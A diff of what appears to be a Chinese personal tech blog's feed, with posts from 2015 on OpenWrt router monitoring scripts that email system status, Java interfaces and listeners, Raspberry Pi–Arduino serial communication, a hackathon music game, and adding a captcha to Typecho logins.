+DISK_perc = DISK_stats[3]
+# system info
+SYSTEM_info = getSystem()
+# NET infomation
+NET_extranet_ip = getExtranetIp()
+NET_internet_ip = getIntranetIp().lstrip(&#39;&#39;)
+NET_connect_ssid = getSsid()
+
+if __name__ == &#39;__main__&#39;:
+    print(&#39;-------------------------------------------&#39;)
+    print(&quot;System info =&quot;+str(SYSTEM_info))
+    print(&#39;-------------------------------------------&#39;)
+    print(&#39;RAM Total = &#39;+str(RAM_total)+&#39; MB&#39;)
+    print(&#39;RAM Used = &#39;+str(RAM_used)+&#39; MB&#39;)
+    print(&#39;RAM Free = &#39;+str(RAM_free)+&#39; MB&#39;)
+    print(&#39;-------------------------------------------&#39;)
+    print(&#39;DISK Total Space = &#39;+str(DISK_total)+&#39;B&#39;)
+    print(&#39;DISK Used Space = &#39;+str(DISK_used)+&#39;B&#39;)
+    print(&#39;DISK Used Percentage = &#39;+str(DISK_perc))
+    print(&#39;-------------------------------------------&#39;)
+    print(&#39;NET Extranet Ip =&#39;+str(NET_extranet_ip))
+    print(&#39;NET Connect Ssid =&#39;+str(NET_connect_ssid))
+    print(&#39;NET Internet Wan Ip =&#39;+str(NET_internet_ip))
+</code></pre><p>直接调用<code>python sysinfo.py</code>:</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-04-29-openwrt-sysinfo.png" alt="系统信息"></p>
+<p><br><hr></p>
+<h1 id="0x06-WRTnode发送邮件"><a href="#0x06-WRTnode发送邮件" class="headerlink" title="0x06.WRTnode发送邮件"></a>0x06.WRTnode发送邮件</h1><p>好了，系统信息有了，GPIO信息有了，接下来就试试发送邮件了。</p>
+<p>发送邮件3中法案都可以，Lua，Python，Shell，找了找资料，Python写了，但是缺少了一个包，Lua缺少Luasocket模块，Shell要安装模块。</p>
+<p>最后，懵了，全都要依赖，尼玛，看了看，好像Lua安装个Luasocket最简单，一个包轻松： <a href="http://see.sl088.com/wiki/Luasocket" target="_blank" rel="external">http://see.sl088.com/wiki/Luasocket</a> </p>
+<p>安装也不难，接下来就写写吧。</p>
+<p>Lua发送邮件源码模块，设置文件名为<code>email.lua</code>：</p>
+<pre><code>#!/usr/bin/lua
+--[[
+Copyright 2015 http://homeway.me
+@author homeway
+@version 15.04.29
+@link http://homeway.me
+@function lua email module
+-- ]]--
+local smtp = require(&quot;socket.smtp&quot;)
+local M ={}
+M.user = {[&quot;from&quot;]=&quot;&quot;, [&quot;to&quot;]=&quot;&quot;, [&quot;password&quot;]=&quot;&quot;}
+M.mail = {[&quot;subject&quot;]=&quot;&quot;, [&quot;body&quot;]=&quot;&quot;}
+M.sys = {[&quot;server&quot;]=&quot;&quot;}
+M.set = function(data)
+    M.user = data.user
+    M.mail = data.mail
+    M.sys = data.sys    
+end
+M.send = function()
+    rcpt = {
+        M.user[&quot;to&quot;]
+    }
+    mesgt = {
+        headers = {
+            from = M.user[&quot;from&quot;],
+            to = M.user[&quot;to&quot;], --收件人
+            cc = &quot;&quot;, --抄送 
+            subject = M.mail[&quot;subject&quot;] --主题
+        },
+        body = M.mail[&quot;body&quot;]
+    }
+    r, e = smtp.send{
+        from = M.user[&quot;from&quot;],
+        rcpt = rcpt,
+        source = smtp.message(mesgt),
+        server = M.sys[&quot;server&quot;],
+        port = M.sys[&quot;port&quot;],
+        user = M.user[&quot;from&quot;],
+        password = M.user[&quot;password&quot;],
+    }
+    if not r then
+        print(e)
+    else
+        print(&quot;send ok!&quot;)
+    end
+end
+return M
+</code></pre><p>下面是调用方式：</p>
+<pre><code>#!/usr/bin/lua
+local mail = require(&quot;email&quot;)
+local data = {}
+data.user = {[&quot;from&quot;]=&quot;sender@gmail.com&quot;, [&quot;to&quot;]=&quot;receiver@gmail.com&quot;, [&quot;password&quot;]=&quot;password&quot;}
+data.mail = {[&quot;subject&quot;]=&quot;测试邮件模块&quot;, [&quot;body&quot;]=&quot;这是主体内容...&quot;}
+data.sys = {[&quot;server&quot;]=&quot;smtp.gmail.com&quot;, [&quot;port&quot;]=587}
+
+mail.set(data)
+mail.send()
+</code></pre><p>测试下，是可以接收到邮件的，注意GFW，还是别用非法gmail好了，别等半天收不到。</p>
+<p><br><hr></p>
+<h1 id="0x07-重要的东西放后面"><a href="#0x07-重要的东西放后面" class="headerlink" title="0x07.重要的东西放后面"></a>0x07.重要的东西放后面</h1><p>嗯！看到这里，估计菊花也有点疼了，再看最后一点看完就擦洗擦洗去吧。</p>
+<p>最后就是，设置定时器，让路由器定时发送系统信息给指定邮箱。</p>
+<p>嗯…定时器，Linux的一个模块crontab命令，看看功能吧 <code>crontab --help</code></p>
+<p>关于定时器语法，看看这里吧 <a href="http://kvz.io/blog/2007/07/29/schedule-tasks-on-linux-using-crontab/" target="_blank" rel="external">http://kvz.io/blog/2007/07/29/schedule-tasks-on-linux-using-crontab/</a></p>
+<p>这里，我只做简单地，每隔10分钟发送一次系统信息给我邮箱。</p>
+<p>具体怎么做，去下载这个脚本吧：<a href="https://github.com/grasses/OpenWRT-Util/blob/master/lua/crontab.lua" target="_blank" rel="external">https://github.com/grasses/OpenWRT-Util/blob/master/lua/crontab.lua</a></p>
+<p>我的目录是这样的，用户是root：</p>
+<pre><code>~|--script
+    |--schedule
+    |--send
+|--log
+     |--sys.log
+     |--crontab.log
+</code></pre><p>先开一个定时器，定时跑Lua，Lua调用python读取系统信息，生成日志文件，Lua读取日志文件，发送邮箱。</p>
+<p>how to use:<br>step1: configure you email information in this script<br>step2: mkdir /root/log &amp;&amp; mkdir /root/script<br>step3: mv /path/to/crontab.lua /root/script/send<br>step4: chmod +x /root/script/send<br>step5: echo 10,20,30,40,50  <em> </em> <em> </em> /root/script/send &gt; /root/script/schedule<br>step6: crontab /root/script/schedule</p>
+<p>东西有点多，都是散乱的部件，这篇主要介绍细节信息，接下来会做大得模块。</p>
+<p>如果打通路由器，各种嵌入式开发的联网问题就都解决了，所以路由器系统还是很重要的。</p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-29-openwrt-develop-base-util"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-29-openwrt-develop-base-util" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/29/openwrt-develop-base-util/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/29/openwrt-develop-base-util/">http://homeway.me/2015/04/29/openwrt-develop-base-util/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-29 23:59:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-openwrt.png&quot; alt=&quot;OpenWrt&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="OpenWRT" scheme="https://homeway.me/tags/OpenWRT/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Java思想之容器implements与接口interface处理</title>
+    <link href="https://homeway.me/2015/04/13/Java-implements-and-interface/"/>
+    <id>https://homeway.me/2015/04/13/Java-implements-and-interface/</id>
+    <published>2015-04-13T10:32:20.000Z</published>
+    <updated>2015-08-04T14:05:09.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-java.png" alt="Java"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>查了一些国内资料，都说java中extended与implements的区别是，一个类只能有一个继承，一个类可以有多个容器。</p>
+<p>后来去看了些国外资料。</p>
+<p>在我理解上，interface就是一个公共的类，可以包含公共函数、变量。</p>
+<p>Java接口是用于指定一组抽象方法的类来实现一个抽象类型。</p>
+<p>当一个类实现一个接口，它必须继承所有的内声明的抽象方法，好像签订了一份合同，并履行协议。</p>
+<p><hr><br></p>
+<h1 id="0x02-Example"><a href="#0x02-Example" class="headerlink" title="0x02.Example"></a>0x02.Example</h1><p>先来看看怎么声明一个接口，文件保存为 <code>InterFace.java</code>：</p>
+<pre><code>public class InterFace {
+    public static void main(String[] args) {
+        MyTest x = new MyTest();
+        x.speak();
+        x.say();
+        x.fuck();
+    }
+}
+class MyTest implements MyInterface2, MyInterface3 {
+    @Override
+    public void speak() {
+        System.out.println(&quot;MyTest Called =&gt; jump() =&gt;&quot;+MyInterface.hello);
+    }
+    @Override
+    public void fuck() {
+        System.out.println(&quot;MyTest Called =&gt; fuck()&quot;);
+    }
+    @Override
+    public void say() {
+        System.out.println(&quot;MyTest Called =&gt; say()&quot;);
+    }    
+}
+interface MyInterface1{
+    public String hello = &quot;hello&quot;;
+    public void speak();
+}
+interface MyInterface2{
+    public int num = 1;
+    public void fuck();
+}
+// 接口之间可以相互继承
+interface MyInterface3 extends MyInterface1{
+    public void say();
+}
+</code></pre><p>输出如下：</p>
+<pre><code>$javac InterFace.java
+$java InterFace
+
+MyTest Called =&gt; jump() =&gt;hello
+MyTest Called =&gt; say()
+MyTest Called =&gt; fuck()
+</code></pre><p>这里我们声明了3个接口，并且interface3继承自interface1，所以当类容器导入接口interface3就会导入父类接口interface1。</p>
+<p>只要添加了容器implements，就会包含接口中的所有东西，所以必须在<code>MyTest</code>类中添加该重写函数，否则找不到该函数会报错。</p>
+<hr>
+
+<p>再看下面一个例子，多个类共同使用一个interface接口，保存为<code>Account.java</code>：</p>
+<pre><code>interface Transaction {
+    int BALANCE = 500;
+    Object transaction(Object input);
+}
+class CurrentAccount implements Transaction {
+    int bal;
+    public Object transaction(Object input) {
+        this.bal = BALANCE - (int)input;
+        return bal;
+    }
+    public String toString() { return &quot;Current acc&quot;; }
+}
+class SavingsAccount implements Transaction {
+    int bal;
+    public Object transaction(Object input) {
+        this.bal = BALANCE + (int)input;
+        return bal;
+    }
+    public String toString() { return &quot;Savings acc&quot;; }
+}
+public class Account {
+    public static void payment(Transaction t, Object input) {
+        System.out.println(t + &quot; is debited:   &quot; +  t.transaction(input));
+    }
+    public static void deposit(Transaction t, Object input) {
+        System.out.println(t + &quot; is credited:   &quot; +  t.transaction(input));
+    }
+    public static void main(String[] args) {
+        Integer input = new Integer(600);
+        deposit(new SavingsAccount(), input);
+        payment(new CurrentAccount(), input);
+    }
+}
+</code></pre><p>代码输出：</p>
+<pre><code>$javac Account.java
+$java Account
+
+Savings acc is credited:   1100
+Current acc is debited:   -100
+</code></pre><p>一个接口可以供多个类共同使用，并且多个类之间使用不冲突，这样看来，interface倒有点像是静态函数了。</p>
+<p>观察一下这两个实现类活期账户和储蓄账户自动的向上转型在接受Transaction接口Account类中的方法。</p>
+<p>payment()和deposit()方法利用我们所讲的战略设计模式，代表了接口的实现完全脱钩的一个实例。</p>
+<p>从理论上说，你可以适应任何类，只需使它们符合的界面，使用这些方法。</p>
+<hr>
+
+<p>对于接口与容器，我见过的一个更具有实用价值的地方，在于类之间的监听函数调用。</p>
+<p>类似于js中的事件驱动函数，当有事件发生时候，通过回调函数，通知主函数。</p>
+<p>实例代码如下，文件命名为Homeway.java：</p>
+<pre><code>public class Homeway {
+    public static void main(String[] args) {
+        System.out.println(&quot;\n=======================Implements======================\n&quot;);
+        ClassImplements mClassImplements = new ClassImplements();
+        mClassImplements.run();
+    }
+}
+class ClassImplements implements Implements1.Listener {
+    public Implements1 mImplements1 = null;
+    public ClassImplements(){
+        mImplements1 = new Implements1();
+        mImplements1.setListener(this);
+    }
+    @Override
+    public void onCallStart(){
+        System.out.println(&quot;ClassImplements =&gt; onCallStart()&quot;);
+    }
+    @Override
+    public void onCallStop(){
+        System.out.println(&quot;ClassImplements =&gt; onCallStop()&quot;);
+    }
+    public void run(){
+        mImplements1.run();
+    }
+}
+//test 2level implements for class
+class Implements1 implements Implements2.Listener {
+    private Listener mListener;
+    private Implements2 mImplements2;
+    public Implements1(){
+        mImplements2 = new Implements2();//把当前类传给下个类
+        mImplements2.setListener(this);
+        System.out.println(&quot;Init Implements1 =&gt;...&quot;);
+    }
+    public static interface Listener {
+        void onCallStart();
+        void onCallStop();
+    }
+    public void setListener(Listener listener) {
+        mListener = listener;
+    }
+    @Override
+    public void onCallStart(){
+        System.out.println(&quot;Implements1 =&gt; onCallStart()&quot;);
+        mListener.onCallStart();//call at Implements1 and then throw to ClassImplements
+    }
+    @Override
+    public void onCallStop(){
+        System.out.println(&quot;Implements1 =&gt; onCallStop()&quot;);
+        mListener.onCallStop();//call at Implements1 and then throw to ClassImplements
+    }
+    public void run(){
+        this.mImplements2.run();
+    }
+}
+
+//3 level implement test
+class Implements2{
+    private Listener mListener;
+    public Implements2(){
+        System.out.println(&quot;Init Implements2 =&gt;...&quot;);
+    }
+    public static interface Listener {
+        void onCallStart();
+        void onCallStop();
+    }
+    public void setListener(Listener listener) {
+        mListener = listener;
+    }
+    public void onCallStart(){
+        System.out.println(&quot;Implements2 =&gt; onCallStart()&quot;);
+    }
+    public void onCallStop(){
+        System.out.println(&quot;Implements2 =&gt; onCallStop()&quot;);
+    }
+    public void run() {
+        System.out.println(&quot;Run some functions and then callback from Listener...&quot;);
+        mListener.onCallStart();
+        mListener.onCallStop();
+    }
+
+}
+</code></pre><p>输出如下：</p>
+<pre><code>$javac Homeway.java
+$java Homeway
+=======================Implements======================
+Init Implements2 =&gt;...
+Init Implements1 =&gt;...
+Run some functions and then callback from Listener...
+Implements1 =&gt; onCallStart()
+ClassImplements =&gt; onCallStart()
+Implements1 =&gt; onCallStop()
+ClassImplements =&gt; onCallStop()
+</code></pre><p>我们先是声明了类ClassImplements，这个是我们的主类，并且implements了<code>Implements1.Listener</code>通过一个Listener建立了监听接口，</p>
+<p>然后<code>Implements1</code>又implements了<code>Implements2.Listener</code>建立了第2级的监听。</p>
+<p>一旦<code>Implements1</code>或<code>Implements2</code>内的某个函数触发了某个事件，就能通过监听接口发送给主函数<code>ClassImplements</code>，类似js中的事件回调函数。</p>
+<p>父类与子类通过Listener实现接口调用，此时Listener即为父类本身。</p>
+<p>大致的模型如下：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-04-13-java-implements-and-interface.jpg" alt="模型"></p>
+<p>implements容器与interface接口在java类中有很多很好用的模型，有时间该多去研究研究。</p>
+<p><hr><br></p>
+<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><ul>
+<li><p><a href="http://tutorials.jenkov.com/java/interfaces.html" target="_blank" rel="external">《Java Interfaces》</a></p>
+</li>
+<li><p><a href="https://weblogs.java.net/blog/hellofadude/archive/2014/01/18/java-interfaces-and-concept-multiple-inheritance" target="_blank" rel="external">《Java interfaces and the concept of multiple inheritance》</a> </p>
+</li>
+<li><p><a href="https://blog.udemy.com/java-interface-example/" target="_blank" rel="external">《Java Interface Example, Explanation, and Implementation》</a></p>
+</li>
+</ul>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-13-java-implements-and-interface"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-13-java-implements-and-interface" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/13/java-implements-and-interface/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/13/java-implements-and-interface/">http://homeway.me/2015/04/13/java-implements-and-interface/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-13 20:10:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-java.png&quot; alt=&quot;Java&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Java" scheme="https://homeway.me/tags/Java/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Raspberry与Arduino建立不可靠串口通信</title>
+    <link href="https://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/"/>
+    <id>https://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</id>
+    <published>2015-04-08T12:12:20.000Z</published>
+    <updated>2015-08-04T13:59:20.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-arduino.png" alt="Arduino"></p>
+<a id="more"></a>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>Arduino与Raspberry通过Serial通信的方案一般有两种，通过树莓派GPIO串口通信，还有，通过USB串口通信。</p>
+<p>显然，通过USB通信比GPIO通信高效稳定多了。</p>
+<p>看过TCP握手通信的人都应该明白，通信双方通信要通过3此握手才能开启TCP连接。</p>
+<p>相同的，串口通信也是可以这么理解，我之前尝试通过简单地发送与接收来传递信息，发现，不但有信息丢包，而且各种问题。</p>
+<p>举个例子，A-&gt;R，A串口写入，R串口监听；R-&gt;A，R写入时候，A监听。</p>
+<p>那么好了，时间怎么约定？A写入要多久？B要监听多久？我们都知道，Arduino是单线程的，所以Arduino的串口通信是单信道。</p>
+<h1 id="0x02-Coding"><a href="#0x02-Coding" class="headerlink" title="0x02.Coding"></a>0x02.Coding</h1><p>这里串口的波特率设置成9600，所以还要做串口波特率修改（你可以用原始的 115200），但是对树莓派的性能不要指望太多，太快不好。</p>
+<p>关于修改串口波特率可以看这里，或者你懒不改也行：<a href="http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi" target="_blank" rel="external">http://blog.miguelgrinberg.com/post/a-cheap-bluetooth-serial-port-for-your-raspberry-pi</a></p>
+<p>这里Arduino输出是string格式，我们要在树莓派那里转成dict字典模式方便调用，所以，约定数据格式为 </p>
+<p><code>{&#39;result&#39;:True/False, &#39;data&#39;:&#39;...&#39;}</code>，在Arduino端用 <code>-</code> 断开字符串。</p>
+<p>好了，下面是Arduino：</p>
+<pre><code>String readString; 
+String data;
+String flag;
+void setup()
+{
+  Serial.begin(9600);
+}
+void loop()
+{
+    while(!Serial.available()) {}
+    while (Serial.available()) {
+        if (Serial.available() &gt;0) {
+            char c = Serial.read();
+            readString += c;
+        }
+    }
+
+    if (readString.length() &gt;0) {
+        flag = &quot;True&quot;;
+        data = flag+&quot;-&quot;+readString;
+        Serial.println(data);
+        readString=&quot;&quot;;
+        delay(200);
+    }
+    Serial.flush();
+}
+</code></pre><p>关于Raspberry端代码：</p>
+<pre><code>#!/usr/bin/python
+import serial
+import json
+import syslog,time,sys
+
+port = &#39;/dev/tty.usbmodem1411&#39;
+def main(port):
+    ard = serial.Serial(port,9600,timeout=1)
+    i = 0
+    send =&quot;&quot;
+    time.sleep(1.5)
+    while (i&lt;5):
+        send += &#39;Everything Ok~&#39;
+        ard.flush()
+        send = str(send)
+        print (&quot;Python value sent: &quot;)
+        print (send)
+        ard.write(send)
+
+        msg = ard.readline().strip(&#39;\n\r&#39;) #ard.read(ard.inWaiting()).strip(&#39;\n\r&#39;) 
+        print (&quot;Message from arduino: &quot;)
+
+        try:
+            key = [&#39;result&#39;,&#39;data&#39;]
+            value = msg.split(&#39;-&#39;,2)
+            data = dict(zip(key,value))
+        except:
+            print &#39;ERROR!&#39;
+        print msg
+
+        time.sleep(0.3)
+        i = i + 1
+    else:
+        print &quot;Exiting&quot;
+    exit()
+
+if __name__ == &#39;__main__&#39;:
+    try:
+        main(sys.argv[1] if len(sys.argv) &gt; 1 else port )
+    except KeyboardInterrupt:
+        ser.close()
+</code></pre><p>关于端口自己查找 <code>ls /dev/tty*</code></p>
+<p>这里有2个时间延迟，第一个是做串口初始化等待，第二个是等待数据传输。</p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-08-raspberry-connect-to-arduion-by-serial"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-08-raspberry-connect-to-arduion-by-serial" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/">http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-08 20:56:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-arduino.png&quot; alt=&quot;Arduino&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Work" scheme="https://homeway.me/categories/Work/"/>
+    
+    
+      <category term="树莓派" scheme="https://homeway.me/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+      <category term="Arduino" scheme="https://homeway.me/tags/Arduino/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>基于树莓派的体感音乐游戏</title>
+    <link href="https://homeway.me/2015/03/30/play-music-through-senses/"/>
+    <id>https://homeway.me/2015/03/30/play-music-through-senses/</id>
+    <published>2015-03-30T05:59:20.000Z</published>
+    <updated>2015-08-04T13:53:32.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-raspberry-pi.png" alt="Raspberry-Pi"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>这是2015沪港黑客马拉松的获奖作品，获得了全场大奖，并获得香港参赛机会。</p>
+<p>关于源码，已经上传到github上了。<a href="https://github.com/2015-hackathon/hackathon" target="_blank" rel="external">https://github.com/2015-hackathon/hackathon</a></p>
+<p>作品通过超声波传感器检测距离，类似特雷门琴，通过距离变化弹奏音符，以此来弹奏游戏中的音符。</p>
+<p>下面是关于作品几张图片：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-1.jpg" alt="作品原型"></p>
+<p><hr><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-2.jpg" alt="作品硬件端"></p>
+<p><hr><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-3.jpg" alt="作品硬件端"></p>
+<p><hr><br></p>
+<p>作品演示视频：</p>
+<video src="http://77l5jp.com1.z0.glb.clouddn.com/blog/play-music-through-senses-2.pm4.mp4" controls="controls"></video>
+
+<p><br></p>
+<p>比赛路演：</p>
+<video src="http://77l5jp.com1.z0.glb.clouddn.com/blog/play-music-through-senses-1.pm4.mp4" controls="controls"></video>
+
+
+<p><hr><br></p>
+<h1 id="0x02-作品原理"><a href="#0x02-作品原理" class="headerlink" title="0x02.作品原理"></a>0x02.作品原理</h1><h4 id="原理如下："><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h4><p>超声波测距获取超声波与手之间的距离（不同距离即模拟钢琴的不同按键），</p>
+<p>通过socket发送给socket服务端sever，服务端转发数据给web客户端client，</p>
+<p>web端client用当前符与超声波发送距离比对，检测是否正确，正确即加分。</p>
+<p>另外，显示的超级玛丽视频是用于界面效果，与游戏无关。</p>
+<p><br></p>
+<h4 id="基本Socket流程图如下："><a href="#基本Socket流程图如下：" class="headerlink" title="基本Socket流程图如下："></a>基本Socket流程图如下：</h4><p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-4.png" alt="系统整体流程图"></p>
+<p>服务器端socket使用php，树莓派端socket使用python，这里用到了一个pyhon的socket转websocket模块，模块在github上搜得到，<a href="https://github.com/GulDmitry/php-websocket-server" target="_blank" rel="external">https://github.com/GulDmitry/php-websocket-server</a>。</p>
+<p><br></p>
+<h4 id="关于前端音符编码"><a href="#关于前端音符编码" class="headerlink" title="关于前端音符编码"></a>关于前端音符编码</h4><p>发音模块使用的是underscorejs的库：<a href="http://underscorejs.org/" target="_blank" rel="external">http://underscorejs.org/</a></p>
+<p>该库需要将音符转码，把音符声调、音长、音高低转成电子码，由于没有音乐知识，这部分浪费了队友3d很多时间。</p>
+<p>1、do、re、mi、fa、so、la、xi、du，编码换算表如下：</p>
+<pre><code>var NOTE_MAP_REVERSE = {//换算公式
+    1: &#39;C&#39;,
+    2: &#39;D&#39;,
+    3: &#39;E&#39;,
+    4: &#39;F&#39;,
+    5: &#39;G&#39;,
+    6: &#39;A&#39;,
+    7: &#39;B&#39;
+};
+</code></pre><p>2、关于还有音高和音低，3、4、4等代表升调。</p>
+<p>3、另外关于音长与音短，0.25、0.5代表半拍、一拍音长。</p>
+<p>换算结果类似如下，一串数组：</p>
+<pre><code>[[&quot;E4&quot;, 0.5], [&quot;E4&quot;, 0.5], [&quot;E4&quot;, 0.5], [&quot;C4&quot;, 0.25], [&quot;E5&quot;, 0.25], [&quot;G4&quot;, 0.5]]
+</code></pre><p><hr><br></p>
+<h1 id="0x03-关于本次hackathon"><a href="#0x03-关于本次hackathon" class="headerlink" title="0x03.关于本次hackathon"></a>0x03.关于本次hackathon</h1><p>这是我第五次参加hackathon了吧，每一次都能遇到很多很有能力的队友，在很短的时间内做了很多平时这么短时间内做不完的事情。</p>
+<p>本次黑客马拉松很开心认识了两位好码友。</p>
+<p>还是本着那个最初的想法，只做好玩的东西，只做有创意的东西。</p>
+<p>下面是团队照片：</p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-6.jpg" alt="团队照片"></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-5.jpg" alt="团队照片"></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/2015-03-30-hackathon-7.jpg" alt="团队照片"></p>
+<p>感谢团队每个人。</p>
+<p><br><hr><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-30-play-music-through-senses"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-30-play-music-through-senses" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/30/play-music-through-senses/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/30/play-music-through-senses/">http://homeway.me/2015/03/30/play-music-through-senses/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-30 17:19:20</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-raspberry-pi.png&quot; alt=&quot;Raspberry-Pi&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Work" scheme="https://homeway.me/categories/Work/"/>
+    
+    
+      <category term="树莓派" scheme="https://homeway.me/tags/%E6%A0%91%E8%8E%93%E6%B4%BE/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Typecho添加验证码</title>
+    <link href="https://homeway.me/2015/03/25/add-check-code-for-typecho/"/>
+    <id>https://homeway.me/2015/03/25/add-check-code-for-typecho/</id>
+    <published>2015-03-25T05:40:20.000Z</published>
+    <updated>2015-03-27T05:13:19.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/logo-typecho.png" alt="Typecho"></p>
+<a id="more"></a>
+<p><br><hr><br></p>
+<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>写Typecho主题时候碰到的问题，在登录时候添加验证码。</p>
+<p>Typecho有很好的路由机制，并且MVC模型模块化做的很好。</p>
+<p>系统代码在<code>/var/</code>中，包括了：Widget工具，Typecho模型等。</p>
+<p>开发者二次开发代码在<code>/usr/</code>中，主要放置Theme主题，Plugins插件等。</p>
+<p>添加验证码不能用插件形式，因此只能直接在源码中更改。</p>
+<p>这里说两种验证码方式，<a href="http://geetest.com/" target="_blank" rel="external">Geetest极验验证</a>，和用php生成图片两种方法。</p>
+<p><hr><br></p>
+<h1 id="0x02-Geetest极验"><a href="#0x02-Geetest极验" class="headerlink" title="0x02.Geetest极验"></a>0x02.Geetest极验</h1><p>这个简单，到<a href="http://geetest.com/" target="_blank" rel="external">http://geetest.com/</a>官网注册下账号。</p>
+<p>1、按照极验的要求，修改前端代码，即，在/admin/login.php中添加代码。</p>
+<p>2、添加Geetest插件，在<code>/var/Widget/</code>中添加Geetestlib.php</p>
+<p>3、修改后台验证端，修改<code>/var/Widget/Login.php</code>如下：</p>
+<pre><code>require_once(&#39;Geetestlib.php&#39;);
+class Widget_Login extends Widget_Abstract_Users implements Widget_Interface_Do {
+    public function action() {
+        /*  此处...省略...字 */
+        $captcha_id = &quot;...自己填&quot;;//TODO: replace it with your own captcha&#39;s id
+        $private_key = &quot;...自己填&quot;;//TODO: replace it with your own captcha&#39;s key
+        $geetestlib = new GeetestLib($captcha_id,$private_key);
